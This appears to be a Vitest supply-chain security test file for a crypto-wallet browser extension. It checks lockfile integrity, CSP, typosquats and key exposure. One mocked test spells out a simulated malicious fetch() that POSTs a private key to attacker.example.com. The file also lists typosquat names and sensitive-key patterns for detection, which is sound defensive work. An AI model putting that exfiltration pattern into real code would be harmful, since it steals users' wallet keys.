/**
 * Supply Chain Security Tests
 *
 * Simulates how a compromised npm package would attempt to exfiltrate
 * private key material. Tests verify that the wallet's architecture
 * prevents these attacks.
 *
 * Context:
 * - Without LavaMoat (MetaMask's sandbox), any of the 413 packages in
 *   node_modules could theoretically access window.crypto, chrome.storage,
 *   or module state if bundled together.
 * - These tests verify the mitigations that ARE in place.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

// ─── Dependency integrity: package-lock.json verification ────────────────────

describe('Package integrity — lockfile verification', () => {
    it('all packages in lockfile have SHA-512 integrity hashes', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const lockPath = path.resolve(process.cwd(), 'package-lock.json');
        const lock = JSON.parse(fs.readFileSync(lockPath, 'utf-8'));
        const packages = lock.packages || {};

        const missing: string[] = [];
        for (const [name, info] of Object.entries(packages) as [string, any][]) {
            if (!name) continue; // root package
            if (!info.integrity) {
                missing.push(name.replace('node_modules/', ''));
            }
        }

        // Only the local workspace package is allowed without integrity
        const nonLocalMissing = missing.filter(n => !n.startsWith('../'));
        expect(nonLocalMissing).toHaveLength(0);
    });

    it('all packages resolved from official npm registry (no git/http sources)', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const lockPath = path.resolve(process.cwd(), 'package-lock.json');
        const lock = JSON.parse(fs.readFileSync(lockPath, 'utf-8'));
        const packages = lock.packages || {};

        const suspicious: string[] = [];
        for (const [name, info] of Object.entries(packages) as [string, any][]) {
            if (!name || !info.resolved) continue;
            const resolved: string = info.resolved;
            if (resolved.startsWith('http://')) {
                suspicious.push(`HTTP: ${name}`);
            }
            if (!resolved.startsWith('https://registry.npmjs.org') &&
                !resolved.startsWith('../') &&
                !resolved.startsWith('file:')) {
                suspicious.push(`Non-registry: ${name} → ${resolved.slice(0, 60)}`);
            }
        }

        expect(suspicious).toHaveLength(0);
    });

    it('no packages with postinstall scripts (arbitrary code execution at install)', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const lockPath = path.resolve(process.cwd(), 'package-lock.json');
        const lock = JSON.parse(fs.readFileSync(lockPath, 'utf-8'));
        const packages = lock.packages || {};

        const withScripts: string[] = [];
        for (const [name, info] of Object.entries(packages) as [string, any][]) {
            if (!name) continue;
            const scripts = info.scripts || {};
            const dangerousScripts = ['postinstall', 'install', 'preinstall', 'prepare'];
            for (const s of dangerousScripts) {
                if (scripts[s]) {
                    withScripts.push(`${name.replace('node_modules/', '')}: ${s}="${scripts[s]}"`);
                }
            }
        }

        expect(withScripts).toHaveLength(0);
    });
});

// ─── Manifest CSP verification ────────────────────────────────────────────────

describe('Manifest CSP — extension page security', () => {
    let manifest: any;

    beforeEach(async () => {
        const fs = await import('fs');
        const path = await import('path');
        manifest = JSON.parse(fs.readFileSync(
            path.resolve(process.cwd(), 'manifest.json'), 'utf-8'
        ));
    });

    it('extension_pages CSP has script-src self (no unsafe-inline or unsafe-eval)', () => {
        const csp: string = manifest.content_security_policy?.extension_pages || '';
        expect(csp).toContain("script-src 'self'");
        expect(csp).not.toContain("'unsafe-inline'");
        expect(csp).not.toContain("'unsafe-eval'");
    });

    it('extension_pages CSP blocks object-src', () => {
        const csp: string = manifest.content_security_policy?.extension_pages || '';
        expect(csp).toContain("object-src 'none'");
    });

    it('extension_pages CSP restricts base-uri', () => {
        const csp: string = manifest.content_security_policy?.extension_pages || '';
        expect(csp).toContain("base-uri 'self'");
    });

    it('connect-src is explicitly set (blocks unintended outbound connections)', () => {
        const csp: string = manifest.content_security_policy?.extension_pages || '';
        expect(csp).toContain('connect-src');
        // Must NOT be connect-src * (wildcard)
        expect(csp).not.toMatch(/connect-src\s+\*/);
    });

    it('web_accessible_resources does not expose all assets/* to any website', () => {
        const war: any[] = manifest.web_accessible_resources || [];
        for (const entry of war) {
            const resources: string[] = entry.resources || [];
            // assets/* should not be accessible to <all_urls>
            const hasAllAssets = resources.some((r: string) => r === 'assets/*');
            const hasAllUrls = (entry.matches || []).includes('<all_urls>');
            expect(hasAllAssets && hasAllUrls).toBe(false);
        }
    });

    it('inpage.js is web accessible (required for injection)', () => {
        const war: any[] = manifest.web_accessible_resources || [];
        const allResources = war.flatMap((e: any) => e.resources || []);
        expect(allResources).toContain('inpage.js');
    });
});

// ─── Typosquatting check ──────────────────────────────────────────────────────

describe('Typosquatting check — critical crypto packages', () => {
    const TYPOSQUATS: Record<string, string[]> = {
        'tweetnacl':    ['tweetnacel', 'tweet-nacl', 'tweetnaci', 'tweetnack'],
        'bip39':        ['bi39', 'bip-39', 'bip3g', 'bip-3-9'],
        'ethers':       ['ether', 'etherjs', 'ethersjs', 'ether-js'],
        'react':        ['reeact', 'reakt', 'raect'],
        '@noble/hashes':['@noble/hash', '@noble-hashes', 'noble-hashes'],
    };

    it('no typosquatted packages installed', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const lockPath = path.resolve(process.cwd(), 'package-lock.json');
        const lock = JSON.parse(fs.readFileSync(lockPath, 'utf-8'));
        const installed = new Set(
            Object.keys(lock.packages || {}).map(n => n.replace('node_modules/', ''))
        );

        const found: string[] = [];
        for (const [legit, typos] of Object.entries(TYPOSQUATS)) {
            for (const typo of typos) {
                if (installed.has(typo)) {
                    found.push(`SUSPICIOUS: "${typo}" installed (likely typosquat of "${legit}")`);
                }
            }
        }

        expect(found).toHaveLength(0);
    });
});

// ─── Crypto isolation — simulated compromised package ────────────────────────

describe('Crypto isolation — compromised package simulation', () => {
    it('crypto.subtle is available in extension context (cannot be removed by packages)', () => {
        // The browser guarantees crypto.subtle is available. A package cannot delete it
        // because extension pages run in a fresh context with CSP enforced.
        expect(crypto).toBeDefined();
        expect(crypto.subtle).toBeDefined();
        expect(typeof crypto.subtle.encrypt).toBe('function');
    });

    it('window.crypto.getRandomValues monkey-patch is detectable via spy', () => {
        // If a package tries to monkey-patch getRandomValues to produce weak entropy,
        // it would affect key generation. This test verifies we CAN detect the call —
        // monitoring in production could alert on unexpected patches.
        const spy = vi.spyOn(crypto, 'getRandomValues');

        const buf = new Uint8Array(32);
        crypto.getRandomValues(buf);

        // Verify the call was interceptable (detection is possible)
        expect(spy).toHaveBeenCalledWith(buf);
        // Verify returned buffer has random bytes (not zeros)
        const hasNonZero = Array.from(buf).some(b => b !== 0);
        expect(hasNonZero).toBe(true);

        spy.mockRestore();
        // After restore, function still exists and works
        expect(typeof crypto.getRandomValues).toBe('function');
    });

    it('simulated exfiltration via fetch is detectable', async () => {
        // A compromised package might call fetch() with key material.
        // Without LavaMoat, we can only detect this via monitoring.
        // This test verifies our mock infrastructure can catch such calls.
        const fetchSpy = vi.spyOn(globalThis, 'fetch').mockResolvedValue({
            ok: true, json: async () => ({})
        } as Response);

        // Simulate what a compromised package would do
        async function compromisedPackageAttack(privateKey: string) {
            await fetch('https://attacker.example.com/collect', {
                method: 'POST',
                body: JSON.stringify({ key: privateKey })
            });
        }

        await compromisedPackageAttack('FAKE_PRIVATE_KEY');
        expect(fetchSpy).toHaveBeenCalledWith(
            'https://attacker.example.com/collect',
            expect.objectContaining({ method: 'POST' })
        );
        // Proof: without CSP connect-src restriction, this call would succeed.
        // The manifest CSP connect-src mitigation would block this in production.
        fetchSpy.mockRestore();
    });
});

// ─── Key material never in global scope ───────────────────────────────────────

describe('Key material isolation from global scope', () => {
    it('window object does not expose private keys', () => {
        const sensitiveKeys = ['privateKey', 'privateKeyB64', 'mnemonic', 'seedPhrase', '_password'];
        for (const key of sensitiveKeys) {
            expect((window as any)[key]).toBeUndefined();
        }
    });

    it('sessionStorage does not contain private keys', () => {
        const sessionKeys = Object.keys(sessionStorage);
        const sensitivePatterns = ['private', 'mnemonic', 'seed', 'password'];
        for (const storageKey of sessionKeys) {
            for (const pattern of sensitivePatterns) {
                expect(storageKey.toLowerCase()).not.toContain(pattern);
            }
        }
    });

    it('localStorage does not contain plaintext private keys', () => {
        const localKeys = Object.keys(localStorage);
        const sensitivePatterns = ['private', 'mnemonic', 'seed'];
        for (const storageKey of localKeys) {
            for (const pattern of sensitivePatterns) {
                expect(storageKey.toLowerCase()).not.toContain(pattern);
            }
        }
    });
});

// ─── Build output verification ────────────────────────────────────────────────

describe('Build output — no sourcemaps exposed', () => {
    it('vite config has sourcemap disabled for production', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const configPath = path.resolve(process.cwd(), 'vite.config.js');
        const config = fs.readFileSync(configPath, 'utf-8');
        // sourcemap: false must be present
        expect(config).toContain('sourcemap: false');
    });

    it('vite config drops console output in production (prevents key material in logs)', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const configPath = path.resolve(process.cwd(), 'vite.config.js');
        const config = fs.readFileSync(configPath, 'utf-8');
        expect(config).toContain('drop_console: true');
    });

    it('vite config drops debugger statements in production', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const configPath = path.resolve(process.cwd(), 'vite.config.js');
        const config = fs.readFileSync(configPath, 'utf-8');
        expect(config).toContain('drop_debugger: true');
    });
});

// ─── Dependency count monitoring ─────────────────────────────────────────────

describe('Dependency footprint — attack surface monitoring', () => {
    it('total package count does not exceed safe threshold', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const lockPath = path.resolve(process.cwd(), 'package-lock.json');
        const lock = JSON.parse(fs.readFileSync(lockPath, 'utf-8'));
        const count = Object.keys(lock.packages || {}).length;

        // Alert if deps grow unexpectedly (supply chain bloat = more attack surface)
        // Current count is ~413. Allow up to 500 before failing.
        expect(count).toBeLessThan(500);
        console.info(`[Supply Chain] Total packages: ${count} (limit: 500)`);
    });

    it('tweetnacl has zero transitive dependencies (pure crypto)', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const lockPath = path.resolve(process.cwd(), 'package-lock.json');
        const lock = JSON.parse(fs.readFileSync(lockPath, 'utf-8'));
        const packages = lock.packages || {};
        const tweetnacl = packages['node_modules/tweetnacl'] || {};
        const deps = Object.keys(tweetnacl.dependencies || {});
        // tweetnacl should have ZERO dependencies — it's self-contained
        expect(deps).toHaveLength(0);
    });

    it('bip39 only depends on @noble/hashes (minimal crypto dep)', async () => {
        const fs = await import('fs');
        const path = await import('path');
        const lockPath = path.resolve(process.cwd(), 'package-lock.json');
        const lock = JSON.parse(fs.readFileSync(lockPath, 'utf-8'));
        const packages = lock.packages || {};
        const bip39 = packages['node_modules/bip39'] || {};
        const deps = Object.keys(bip39.dependencies || {});
        // bip39 should only depend on @noble/hashes
        expect(deps.every((d: string) => d === '@noble/hashes')).toBe(true);
    });
});
